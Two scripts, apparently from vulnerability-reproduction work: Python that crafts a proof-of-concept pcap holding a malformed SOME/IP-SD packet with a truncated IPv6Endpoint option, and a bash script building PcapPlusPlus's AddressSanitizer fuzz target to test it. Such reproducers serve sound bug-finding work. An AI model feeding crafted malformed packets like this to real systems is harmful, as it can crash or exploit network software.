# Build the UDP payload (SOME/IP-SD) - 32 bytes
sd = bytearray(32)
# someiphdr (16 bytes)
sd[0:2]   = struct.pack('>H', 0xFFFF)      # serviceID
sd[2:4]   = struct.pack('>H', 0x8100)      # methodID (SD)
sd[4:8]   = struct.pack('>I', 24)          # length (payload after the 8-byte msg id+length)
sd[8:10]  = struct.pack('>H', 0)           # clientID
sd[10:12] = struct.pack('>H', 0)           # sessionID
sd[12]    = 0x01                            # protocolVersion
sd[13]    = 0x01                            # interfaceVersion
sd[14]    = 0x02                            # msgType = NOTIFICATION
sd[15]    = 0x00                            # returnCode
# someipsdhdr extra (4 bytes)
sd[16]    = 0x00                            # flags
sd[17:20] = b'\x00\x00\x00'                 # reserved
# length of entries
sd[20:24] = struct.pack('>I', 0)            # 0 entries
# length of options
sd[24:28] = struct.pack('>I', 4)            # 4 bytes of options
# option: base header only (length=1, type=0x06 IPv6Endpoint, reserved)
sd[28:30] = struct.pack('>H', 1)            # option length field = 1 (total 4 bytes)
sd[30]    = 0x06                            # IPv6Endpoint
sd[31]    = 0x00                            # reserved

assert len(sd) == 32

# UDP header
udp = bytearray(8)
udp[0:2] = struct.pack('>H', 12345)         # src port
udp[2:4] = struct.pack('>H', 30490)         # dst port (SOME/IP-SD)
udp[4:6] = struct.pack('>H', 8 + len(sd))   # UDP length
udp[6:8] = struct.pack('>H', 0)             # checksum 0

# IPv4 header
ip = bytearray(20)
ip[0] = 0x45                                 # version/IHL
ip[1] = 0x00
ip[2:4] = struct.pack('>H', 20 + 8 + len(sd))  # total length
ip[4:6] = struct.pack('>H', 0)               # id
ip[6:8] = struct.pack('>H', 0)               # flags/frag
ip[8] = 64                                   # TTL
ip[9] = 17                                   # UDP
ip[10:12] = struct.pack('>H', 0)             # checksum (unused)
ip[12:16] = bytes([10,0,0,1])
ip[16:20] = bytes([10,0,0,2])

# Ethernet
eth = bytearray(14)
eth[0:6]   = bytes([0x02,0,0,0,0,1])          # dst
eth[6:12]  = bytes([0x02,0,0,0,0,2])          # src
eth[12:14] = struct.pack('>H', 0x0800)        # IPv4

frame = bytes(eth + ip + udp + sd)
print("frame len:", len(frame))
assert len(frame) == 74

# pcap file
pcap = bytearray()
pcap += struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)  # global header
pcap += struct.pack('<IIII', 0, 0, len(frame), len(frame))           # record header
pcap += frame

open('poc.pcap', 'wb').write(bytes(pcap))
print("wrote poc.pcap, size", len(pcap))
# also dump frame for local test
open('frame.bin', 'wb').write(frame)

#!/usr/bin/env bash
# Build the actual OSS-Fuzz FuzzTarget for PcapPlusPlus (address sanitizer + libFuzzer)
set -euxo pipefail

export SRC=/gt/_work/src
export WORK=/gt/fuzzbuild
export OUT=$WORK/out
mkdir -p $WORK $OUT

# 1) Build libpcap statically
if [ ! -d $WORK/libpcap ]; then
  git clone --depth 1 https://github.com/the-tcpdump-group/libpcap.git $WORK/libpcap
fi
cd $WORK/libpcap
./autogen.sh
./configure --enable-shared=no --disable-dbus --disable-bluetooth --disable-usb --disable-rdma --disable-dag --disable-septel --disable-snf --disable-tc --disable-netmap --disable-can --disable-libnl --without-libnl CFLAGS="-O1 -g -fsanitize=address -fno-omit-frame-pointer"
make -j$(nproc) CFLAGS="-O1 -g -fsanitize=address -fno-omit-frame-pointer"

# 2) Build PcapPlusPlus fuzzers
cd $SRC
LIBPCAP_PATH=$WORK/libpcap/
cmake -DPCAPPP_BUILD_FUZZERS=ON -DPCAPPP_BUILD_TESTS=OFF -DPCAPPP_BUILD_EXAMPLES=OFF \
  -DPCAPPP_USE_SANITIZER=AddressSanitizer \
  -DPCAP_INCLUDE_DIR="${LIBPCAP_PATH}" -DPCAP_LIBRARY="${LIBPCAP_PATH}/libpcap.a" \
  -S . -B $WORK/build \
  -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_C_COMPILER=clang \
  -DCMAKE_CXX_FLAGS="-O1 -g -fsanitize=address -fno-omit-frame-pointer" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address"
cmake --build $WORK/build --target FuzzTarget -j$(nproc)

ls -la $WORK/build/Tests/Fuzzers/FuzzTarget
